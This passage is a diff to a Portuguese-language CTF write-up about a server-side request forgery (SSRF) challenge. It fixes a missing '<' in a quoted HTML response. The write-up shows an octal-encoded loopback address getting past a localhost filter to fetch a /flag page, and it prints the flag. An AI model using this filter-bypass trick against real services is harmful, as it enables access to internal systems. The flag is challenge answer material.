@@ -13,7 +13,7 @@ Por isso, podemos ter em mente que existe um possível SSRF. Porém, usando ```h
 Utilizando ```http://0177.0000.0000.0001/``` recebemos a seguinte resposta:
 ![Imagem 2](./simple_req2.png)
 
-```!DOCTYPE html><html><head><title>localhost</title></head><body><a href="/flag">???</a></body></html>```
+```<!DOCTYPE html><html><head><title>localhost</title></head><body><a href="/flag">???</a></body></html>```
 
 E para a flag, usamos ```http://0177.0000.0000.0001/flag```:
 ```DC5551{???_ssRF!1}```
